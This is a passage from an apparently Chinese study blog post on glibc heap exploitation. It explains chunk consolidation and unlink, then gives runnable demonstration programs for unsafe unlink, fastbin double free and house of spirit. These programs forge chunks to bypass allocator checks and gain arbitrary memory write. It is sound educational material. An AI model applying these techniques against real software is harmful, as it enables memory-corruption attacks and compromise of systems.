src="/2024/07/15/heap-study/overlapping_3.png"><br>通过unlink进行向前的overlapping</p><h1 id="unsafe-unlink-glibc2-31"><a href="#unsafe-unlink-glibc2-31" class="headerlink" title="unsafe_unlink(glibc2.31)"></a>unsafe_unlink(glibc2.31)</h1><h2 id="向前合并向后合并"><a href="#向前合并向后合并" class="headerlink" title="向前合并向后合并"></a>向前合并向后合并</h2><p>当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中。这里的向前即低地址的chunk而非fd，bk指针所指的chunk（向后同理），以当前chunk为基准，将next_free_chunk与当前chunk合并为向前合并，将previous_free_chunk与当前chunk合并为向后合并。</p><h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*malloc.c  int_free函数中*/</span><span class="comment">/*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/</span></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) {</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;<span class="comment">//修改指向当前chunk的指针，指向前一个chunk。</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(p, bck, fwd);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) {</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) {</span><br><span class="line">unlink(nextchunk, bck, fwd);</span><br><span class="line">    size += nextsize;</span><br><span class="line">} <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse_bit_at_offset(p, s)</span></span><br><span class="line">(((mchunkptr)(((<span class="type">char</span>*)(p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) {                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                                               </span><br><span class="line">    BK = P-&gt;bk;                                                               </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     </span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> {                                                                    </span><br><span class="line">        FD-&gt;bk = BK;                                                          </span><br><span class="line">        BK-&gt;fd = FD;                                                          </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) {                           </span><br><span class="line">            ......                                                            </span><br><span class="line">          }                                                                   </span><br><span class="line">      }                                                                       </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 20.04 64bit.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"欢迎来到unsafe unlink 2.0!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"在64位的Ubuntu 20.04上测试。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"当你有一个已知位置的指针指向一个可以调用unlink的区域时，这种技术可以被使用。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最常见的场景是一个可以溢出的易受攻击的缓冲区并且有一个全局指针。\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">// we want to be big enough not to use tcache or fastbin 我们希望大小足够大，不使用tcache或fastbin</span></span><br><span class="line">    <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"这个练习的目的是使用free来破坏全局chunk0_ptr以实现任意内存写入。\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">// chunk0</span></span><br><span class="line">    <span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">// chunk1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"全局chunk0_ptr在%p，指向%p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们要破坏的受害者chunk在%p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们在chunk0内创建一个伪造的chunk。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们设置伪造chunk的大小，以便我们可以绕过在https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f中引入的检查\n"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们将伪造chunk的'next_free_chunk' (fd)设置为指向接近&amp;chunk0_ptr的位置，以便P-&gt;fd-&gt;bk = P。\n"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们将伪造chunk的'previous_free_chunk' (bk)设置为指向接近&amp;chunk0_ptr的位置，以便P-&gt;bk-&gt;fd = P。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"通过这种设置，我们可以通过这个检查：(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr - (<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"伪造chunk的fd: %p\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"伪造chunk的bk: %p\n\n"</span>, (<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们假设我们在chunk0中有一个溢出，可以自由地更改chunk1的元数据。\n"</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们缩小chunk0的大小（存储为chunk1中的'previous_size'），以便free会认为chunk0从我们放置伪造chunk的位置开始。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"重要的是我们的伪造chunk正好从已知指针指向的位置开始，并且我们相应地缩小chunk。\n"</span>);</span><br><span class="line">    chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n"</span>, (<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"如果我们'正常'地释放了chunk0，chunk1.previous_size应该是0x430，但现在它的新值是：%p\n"</span>, (<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"我们通过将chunk1的'previous_in_use'标记为False来标记我们的伪造chunk为已释放。\n\n"</span>);</span><br><span class="line">    chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"现在我们释放chunk1，以便向后合并时将unlink我们的伪造chunk，覆盖chunk0_ptr。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink_chunk function at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"你可以在https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=1ecba1fafc160ca70f81211b23f688df8676e612找到unlink_chunk函数的源代码\n\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"此时我们可以使用chunk0_ptr覆盖自身以指向任意位置。\n"</span>);</span><br><span class="line">    <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(victim_string, <span class="string">"Hello!~"</span>);</span><br><span class="line">    chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk0_ptr现在指向我们想要的位置，我们使用它来覆盖我们的受害字符串。\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>, victim_string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"原始值：%s\n"</span>, victim_string);</span><br><span class="line">    chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>, victim_string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"新值：%s\n"</span>, victim_string);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check 健全性检查</span></span><br><span class="line">    assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分配完两个chunk后<br><img src="/2024/07/15/heap-study/unsafe_unlink_1.png"><br>我们利用chunk0_ptr构造一个fake_chunk来绕过unlink的检查<br><img src="/2024/07/15/heap-study/unsafe_unlink_2.png"><br><img src="/2024/07/15/heap-study/unsafe_unlink_3.png"><br>满足(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</p><p>此时假设能实现堆溢出就可以修改chunk1的元数据<br>来使free认为chunk0为free，以便free(chunk1)后触发unlink<br>此时chunk_ptr指向chunk_ptr - 0x18  </p><p><img src="/2024/07/15/heap-study/unsafe_unlink_4.png">  </p><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><h2 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin_double_free"></a>fastbin_double_free</h2><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><p>以下是一个简单的演示  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">} CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>先进行两次申请</p><p><img src="/2024/07/15/heap-study/fastbin_double_free_1.png"></p><p>在进行三次释放此时</p><p><img src="/2024/07/15/heap-study/fastbin_double_free_2.png"></p><p>可以看到尾部的chunk1指向chunk2</p><p>修改后可以看到</p><p><img src="/2024/07/15/heap-study/fastbin_double_free_3.png"></p><h2 id="house-of-spirit-glibc2-31"><a href="#house-of-spirit-glibc2-31" class="headerlink" title="house_of_spirit(glibc2.31)"></a>house_of_spirit(glibc2.31)</h2><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">house-of-spirit 是一种通过堆的 fast bin 机制来辅助栈溢出的方法</span><br><span class="line">如果栈溢出的时候溢出的长度不能覆盖掉返回地址的但是却可以覆盖栈上面一个即将 free 的指针的话，我们可以把这个指针覆盖为栈上的某一个地址，并且把这个地址上伪造一个 chunk，free 之后再次 malloc 就可以申请到栈上面伪造的那一块，这时候就有可能改写返回地址了</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"This file demonstrates the house of spirit attack."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"本文件演示了 house of spirit 攻击。"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"This attack adds a non-heap pointer into fastbin, thus leading to (nearly) arbitrary write."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"这种攻击将一个非堆指针添加到 fastbin，从而导致（几乎）任意写入。"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Required primitives: known target address, ability to set up the start/end of the target memory"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"所需的基本操作：已知的目标地址，能够设置目标内存的起始/结束"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 1: Allocate 7 chunks and free them to fill up tcache"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n步骤 1：分配 7 个堆块并释放它们以填满 tcache"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *chunks[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line"><span class="built_in">free</span>(chunks[i]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\nStep 2: Prepare the fake chunk"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\n步骤 2：准备伪造的堆块"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="comment">// 这与 fastbinsY 无关（不要被 10 迷惑）- fake_chunks 只是用于分配的内存（由 fastbinsY 指向）</span></span><br><span class="line"><span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The target fake chunk is at %p\n"</span>, fake_chunks);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"目标伪造堆块位于 %p\n"</span>, fake_chunks);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It contains two chunks. The first starts at %p and the second at %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"它包含两个堆块。第一个从 %p 开始，第二个从 %p 开始。\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"该区域的 chunk.size 必须比该区域大 16（以容纳堆块数据），同时仍属于 fastbin 类别（x64 上 &lt;= 128）。对于 fastbin 大小的堆块，free 会忽略 PREV_INUSE（最低位）位，但 IS_MMAPPED（第二最低位）和 NON_MAIN_ARENA（第三最低位）位会引起问题。\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"... 请注意，这必须是下一个 malloc 请求的大小，并四舍五入到 malloc 实现使用的内部大小。例如，在 x64 上，0x30-0x38 都会四舍五入到 0x40，因此它们适用于最后的 malloc 参数。"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now set the size of the chunk (%p) 